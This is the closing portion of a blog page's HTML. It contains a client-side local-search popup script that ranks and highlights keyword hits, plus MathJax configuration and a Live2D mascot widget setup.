                  index.push({position: position, word: word});
                  startPosition = position + wordLen;
                }
                return index;
              }
              indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
              indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
            });
            if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
              isMatch = true;
              hitCount = indexOfTitle.length + indexOfContent.length;
            }
            // show search results
            if (isMatch) {
              // sort index by position of keyword
              [indexOfTitle, indexOfContent].forEach(function (index) {
                index.sort(function (itemLeft, itemRight) {
                  if (itemRight.position !== itemLeft.position) {
                    return itemRight.position - itemLeft.position;
                  } else {
                    return itemLeft.word.length - itemRight.word.length;
                  }
                });
              });
              // merge hits into slices
              function mergeIntoSlice(text, start, end, index) {
                var item = index[index.length - 1];
                var position = item.position;
                var word = item.word;
                var hits = [];
                var searchTextCountInSlice = 0;
                while (position + word.length <= end && index.length != 0) {
                  if (word === searchText) {
                    searchTextCountInSlice++;
                  }
                  hits.push({position: position, length: word.length});
                  var wordEnd = position + word.length;
                  // move to next position of hit
                  index.pop();
                  while (index.length != 0) {
                    item = index[index.length - 1];
                    position = item.position;
                    word = item.word;
                    if (wordEnd > position) {
                      index.pop();
                    } else {
                      break;
                    }
                  }
                }
                searchTextCount += searchTextCountInSlice;
                return {hits: hits, start: start, end: end, searchTextCount: searchTextCountInSlice};
              }
              var slicesOfTitle = [];
              if (indexOfTitle.length != 0) {
                slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
              }
              var slicesOfContent = [];
              while (indexOfContent.length != 0) {
                var item = indexOfContent[indexOfContent.length - 1];
                var position = item.position;
                var word = item.word;
                // cut out 100 characters
                var start = position - 20;
                var end = position + 80;
                if (start < 0) {
                  start = 0;
                }
                if (end < position + word.length) {
                  end = position + word.length;
                }
                if (end > content.length) {
                  end = content.length;
                }
                slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
              }
              // sort slices in content by search text's count and hits' count
              slicesOfContent.sort(function (sliceLeft, sliceRight) {
                if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
                  return sliceRight.searchTextCount - sliceLeft.searchTextCount;
                } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
                  return sliceRight.hits.length - sliceLeft.hits.length;
                } else {
                  return sliceLeft.start - sliceRight.start;
                }
              });
              // select top N slices in content
              var upperBound = parseInt('1');
              if (upperBound >= 0) {
                slicesOfContent = slicesOfContent.slice(0, upperBound);
              }
              // highlight title and content
              function highlightKeyword(text, slice) {
                var result = '';
                var prevEnd = slice.start;
                slice.hits.forEach(function (hit) {
                  result += text.substring(prevEnd, hit.position);
                  var end = hit.position + hit.length;
                  result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
                  prevEnd = end;
                });
                result += text.substring(prevEnd, slice.end);
                return result;
              }
              var resultItem = '';

              // if (slicesOfTitle.length != 0) {   resultItem += "<li><a target='_blank' href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>"; } else {   resultItem += "<li><a target='_blank' href='" +
              // articleUrl + "' class='search-result-title'>" + title + "</a>"; } slicesOfContent.forEach(function (slice) {   resultItem += "<a target='_blank' href='" + articleUrl + "'><p class=\"search-result\">" + highlightKeyword(content, slice) +
              // "...</p></a>"; }); resultItem += "</li>";

              if (slicesOfTitle.length != 0) {
                resultItem += "<a target='_blank' href='" + articleUrl + "' class='search-result'><div class='search-result-left'><div class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</div><time class='search-result-date'>" + dateTime + "</time>";
              } else {
                resultItem += "<a target='_blank' href='" + articleUrl + "' class='search-result'><div class='search-result-left'><div class='search-result-title'>" + title + "</div><time class='search-result-date'>" + dateTime + "</time>";
              }
              slicesOfContent.forEach(function (slice) {
                resultItem += "<p class=\"search-result-content\">" + highlightKeyword(content, slice) + "...</p>";
              });
              resultItem += "</div><div class='search-result-right'><img class='media-image' src='" + imgUrl + "' width='64px' height='48px'></img></div></a>";

              resultItems.push({item: resultItem, searchTextCount: searchTextCount, hitCount: hitCount, id: resultItems.length});
            }
          })
        };

        if (keywords.length === 1 && keywords[0] === "") {
          resultContent.innerHTML = '<div id="no-result"></div>'
        } else if (resultItems.length === 0) {
          resultContent.innerHTML = '<div id="no-result"></div>'
        } else {
          resultItems.sort(function (resultLeft, resultRight) {
            if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
              return resultRight.searchTextCount - resultLeft.searchTextCount;
            } else if (resultLeft.hitCount !== resultRight.hitCount) {
              return resultRight.hitCount - resultLeft.hitCount;
            } else {
              return resultRight.id - resultLeft.id;
            }
          });
          var searchResultList = '<div class=\"search-result-list\">';
          resultItems.forEach(function (result) {
            searchResultList += result.item;
          })
          searchResultList += "</div>";
          resultContent.innerHTML = searchResultList;
        }
      }
      if ('auto' === 'auto') {
        input.addEventListener('input', inputEventFunction);
      } else {
        $('.search-icon').click(inputEventFunction);
        input.addEventListener('keypress', function (event) {
          if (event.keyCode === 13) {
            inputEventFunction();
          }
        });
      }
      // remove loading animation
      $('body').css('overflow', '');
      proceedsearch();
    }
    // handle and trigger popup window;
    $('.popup-trigger').click(function (e) {
      e.stopPropagation();
      if (isfetched === false) {
        searchFunc('local-search-input', 'local-search-result');
      } else {
        proceedsearch();
      };
    });
    $('.popup-btn-close').click(onPopupClose);
    $('.popup').click(function (e) {
      e.stopPropagation();
    });
    $(document).on('keyup', function (event) {
      var shouldDismissSearchPopup = event.which === 27 && $('.search-popup').is(':visible');
      if (shouldDismissSearchPopup) {
        onPopupClose();
      }
    });

    document.addEventListener('mouseup', (e) => {
      var _con = document.querySelector(".local-search-content");
      if (_con) {
        if (!_con.contains(e.target)) {
          onPopupClose();
        }
      }
    });
  </script>


		
	<script type="text/x-mathjax-config">
    MathJax.Hub.Config({
        tex2jax: {
            inlineMath: [ ["$","$"], ["\\(","\\)"] ],
            skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code'],
            processEscapes: true
        }
    });
    MathJax.Hub.Queue(function() {
        var all = MathJax.Hub.getAllJax();
        for (var i = 0; i < all.length; ++i)
            all[i].SourceElement().parentNode.className += ' has-jax';
    });
</script>
<script src="http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginModelPath":"assets/","model":{"jsonPath":"/live2dw/assets/haru02.model.json"},"display":{"position":"right","width":225,"height":225,"right":125},"mobile":{"show":true,"scale":0.5},"react":{"opacityDefault":0.7,"opacityOnHover":0.8},"log":false,"pluginJsPath":"lib/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
</html>
